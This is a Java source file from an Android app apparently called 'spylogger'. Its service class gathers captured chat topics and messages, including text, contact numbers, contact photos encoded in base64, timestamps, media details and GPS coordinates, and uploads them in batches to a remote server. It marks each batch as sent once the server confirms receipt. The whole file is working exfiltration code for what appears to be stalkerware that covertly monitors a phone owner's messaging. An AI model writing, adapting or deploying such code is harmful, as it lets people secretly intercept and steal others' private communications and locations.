package com.gravatasufoca.spylogger.services;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.ContatoVO;
import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.stmt.UpdateBuilder;

import java.io.File;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

import retrofit2.Call;
import retrofit2.Response;

/**
 * Created by bruno on 02/12/16.
 */

public class SendMensagensService extends SendDataService<RespostaRecebimentoVO> {
    private Context context;

    private Integer MAX_TOPICOS=500;
    private Integer MAX_MENSAGENS=5000;

    private List<ContatoVO> contatos;
    List<ContatoVO> contatoVOs=new ArrayList<>();

    public SendMensagensService(Context context, TaskComplete handler) {
        super(handler);
        this.context = context;
    }

    private ContatoVO getContato(String numero, TipoMensagem tipoMensagem){
        for (ContatoVO contato:contatos){
            if(!TipoMensagem.MESSENGER.equals(tipoMensagem)) {
                String num = numero.split("@")[0];
                num = num.indexOf("-") != -1 ? num.split("-")[0] : num;
                num = numero.replaceAll("[^\\d\\+]", "");
                if (contato.getNumero().equals(num)) {
                    return contato;
                }
                if (num.length() > 8) {
                    num = num.substring(num.length() - 8, num.length());
                } else {
                    Log.i("dd", "");
                }
                if (contato.getNumero().endsWith(num)) {
                    return contato;
                }
            }else{
                if (contato.getNome().equalsIgnoreCase(numero)) {
                    return contato;
                }
            }

        }
        return null;
    }

    private List<ContatoVO> getContatos(String numeros, TipoMensagem tipoMensagem){
        List<ContatoVO> contatoVOs=new ArrayList<>();
        if(numeros!=null && !numeros.isEmpty()) {
            String[] nums = numeros.split("#");
            for (String num : nums) {
                if (!num.isEmpty()) {
                    ContatoVO contatoVO = getContato(num, tipoMensagem);
                    if (contatoVO != null) {
                        File foto = Utils.getFotoContato(num);
                        if (foto != null) {
                            contatoVO.setFoto(Utils.encodeBase64(foto));
                        }
                        contatoVOs.add(contatoVO);
                    }
                }
            }
        }
        return contatoVOs;
    }

    public boolean enviarTopicos() {
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        try {
            Dao<Topico, Integer> daoTopicos = dbHelper.getDao(Topico.class);
            Dao<Mensagem, Integer> daoMensagem = dbHelper.getDao(Mensagem.class);

            //limpar TODO: retirar daqui
       /*     UpdateBuilder<Topico, Integer> up = daoTopicos.updateBuilder();
            up.updateColumnValue("enviado", false);
            up.update();
            UpdateBuilder<Mensagem, Integer> up2 = daoMensagem.updateBuilder();
            up2.updateColumnValue("enviada", false);
            up2.update();*/

            GenericRawResults<String[]> raws = daoTopicos.queryRaw("select id,nome,grupo,tipoMensagem,(select group_concat(contato,'#') from ( select distinct contato from mensagem where topico_id=top.id)) from topico top where top.enviado=0 ");

            List<Topico> topicos = new ArrayList<>();
            int contador = 0;
            Iterator<String[]> iterator = raws.iterator();
            if(iterator.hasNext()) {
                while (iterator.hasNext()) {
                    String[] resultRaw = iterator.next();
                    Topico topico = new Topico.TopicoBuilder()
                            .setId(Integer.valueOf(resultRaw[0]))
                            .setNome(resultRaw[1])
                            .setGrupo("1".equals(resultRaw[2]))
                            .build(TipoMensagem.values()[Integer.parseInt(resultRaw[3])]);


//                        contatoVOs.addAll(getContatos(resultRaw[4], topico.getTipoMensagem()));
                    topicos.add(topico);
                    contador++;
                    if (iterator.hasNext()) {
                        if (contador == MAX_TOPICOS) {
                            contador = 0;
                            enviarTopicos(topicos);
                            topicos = new ArrayList<>();
                        }
                    } else {
                        enviarTopicos(topicos);
                    }
                }
            }else{
                enviarMensagens();
            }

        } catch (SQLException e) {
            Log.e(this.getClass().getSimpleName(), e.getMessage());
        }


        return true;
    }

    private void enviarMensagens(){
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        try {
            Dao<Topico, Integer> daoTopicos = dbHelper.getDao(Topico.class);
            Dao<Mensagem, Integer> daoMensagem = dbHelper.getDao(Mensagem.class);

           /* UpdateBuilder<Mensagem, Integer> up2 = daoMensagem.updateBuilder();
            up2.updateColumnValue("enviada", false);
            up2.update();*/

            Map<String, Map<Integer, DataType>> colunas = Mensagem.columns();

            GenericRawResults<Object[]> raws = daoMensagem.queryRaw("select " + getColunas(colunas) + " from mensagem where enviada=0",getTipos(colunas));
            List<Mensagem> mensagens = new ArrayList<>();
            int contador = 0;
            Iterator<Object[]> iterator = raws.iterator();
            while (iterator.hasNext()) {
                Object[] resultRaw = iterator.next();
                try {
                    Mensagem mensagem = new Mensagem.MensagemBuilder()
                            .setId((Integer) resultRaw[colunas.get("id").keySet().iterator().next()])
                            .setContato((String) resultRaw[colunas.get("contato").keySet().iterator().next()])
                            .setTipoMidia(resultRaw[colunas.get("tipoMidia").keySet().iterator().next()] == null ? TipoMidia.CONTATO : TipoMidia.valueOf((String) resultRaw[colunas.get("tipoMidia").keySet().iterator().next()]))
                            .setRemetente("1".equals(resultRaw[colunas.get("remetente").keySet().iterator().next()]))
                            .setMediaMime((String) resultRaw[colunas.get("midiaMime").keySet().iterator().next()])
                            .setNumeroContato((String) resultRaw[colunas.get("numeroContato").keySet().iterator().next()])
                            .setTamanhoArquivo((Long) resultRaw[colunas.get("tamanhoArquivo").keySet().iterator().next()])
                            .setTexto((String) resultRaw[colunas.get("texto").keySet().iterator().next()])
                            .setTopico(new Topico.TopicoBuilder().setId((Integer) resultRaw[colunas.get("topico_id").keySet().iterator().next()]).build(null))
                            .setData((Date) resultRaw[colunas.get("data").keySet().iterator().next()])
                            .setDataRecebida((Date) resultRaw[colunas.get("dataRecebida").keySet().iterator().next()])
                            .setLatitude((Double) resultRaw[colunas.get("latitude").keySet().iterator().next()])
                            .setLongitude((Double) resultRaw[colunas.get("longitude").keySet().iterator().next()])
                            .build();
                    mensagem.setRaw_data(resultRaw[colunas.get("raw_data").keySet().iterator().next()]!=null ? (String)resultRaw[colunas.get("raw_data").keySet().iterator().next()] :null);
//                    mensagem.setThumb_image(resultRaw[colunas.get("thumb_image").keySet().iterator().next()]!=null ? (String)resultRaw[colunas.get("thumb_image").keySet().iterator().next()] :null);


                    mensagens.add(mensagem);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                contador++;
                if (iterator.hasNext()) {
                    if (contador == MAX_MENSAGENS) {
                        contador = 0;
                        enviarMensagens(mensagens);
                        mensagens = new ArrayList<>();
                        break;
                    }
                } else {
                    enviarMensagens(mensagens);
                }
            }
        }catch (SQLException e){
            e.printStackTrace();
        }
    }

    private String getColunas(Map<String, Map<Integer,DataType>> colunas) {
        Set<String> keys = colunas.keySet();
        StringBuffer cols = new StringBuffer();
        Map<Integer, String> inverso = new HashMap<>();
        for (String col : keys) {
            Integer a = colunas.get(col).keySet().iterator().next();
            inverso.put(a, col);
        }
        List<Integer> ids = new ArrayList<>(inverso.keySet());
        Collections.sort(ids);
        for (Integer id : ids) {
            String tmp = inverso.get(id);
            cols.append(cols.toString().isEmpty() ? "" : ",").append(tmp);

        }
        return cols.toString();
    }

    private DataType[] getTipos(Map<String, Map<Integer,DataType>> colunas) {
        Set<String> keys = colunas.keySet();
        StringBuffer cols = new StringBuffer();
        Map<Integer, DataType> inverso = new HashMap<>();
        for (String col : keys) {
            Integer a = colunas.get(col).keySet().iterator().next();
            inverso.put(a, colunas.get(col).values().iterator().next());
        }
        List<Integer> ids = new ArrayList<>(inverso.keySet());
        Collections.sort(ids);
        List<DataType> tipos=new ArrayList<>();
        for (Integer id : ids) {
            tipos.add(inverso.get(id));
        }
        DataType[] tmp=new DataType[tipos.size()];
        tipos.toArray(tmp);
        return tmp;
    }

    private void enviarMensagens(List<Mensagem> mensagens) {
        Call<RespostaRecebimentoVO> resp = sendApi.enviarMensagens(mensagens);
        resp.enqueue(this);
    }

    private void enviarTopicos(List<Topico> topicos) {
        Call<RespostaRecebimentoVO> resp = sendApi.enviarTopicos(topicos);
        resp.enqueue(this);
    }

    @Override
    public void onResponse(Call<RespostaRecebimentoVO> call, Response<RespostaRecebimentoVO> response) {
        final RespostaRecebimentoVO resposta = response.body();

        if (resposta != null) {
            try {
                DatabaseHelper dbHelper = new DatabaseHelper(context);

                if (resposta.getTipo().equalsIgnoreCase("topico")) {
                    Dao<Topico, Integer> daoTopicos = dbHelper.getDao(Topico.class);

                    final UpdateBuilder<Topico, Integer> ub = daoTopicos.updateBuilder();
                    ub.where().in("id", resposta.getIds());
                    ub.updateColumnValue("enviado", true);
                    ub.update();
                    enviarMensagens();
                } else {
                    if (resposta.getTipo().equalsIgnoreCase("mensagem")) {

                        Dao<Mensagem, Integer> daoMensagem = dbHelper.getDao(Mensagem.class);
                        UpdateBuilder<Mensagem, Integer> ub = daoMensagem.updateBuilder();
                        ub.where().in("id", resposta.getIds());
                        ub.updateColumnValue("enviada", true);
//                        ub.updateColumnValue("raw_data", null);
                        ub.update();

                        enviarMensagens();
                    }
                }


            } catch (SQLException e) {
                Log.e(this.getClass().getSimpleName(), e.getMessage());
            }
        }
    }
}
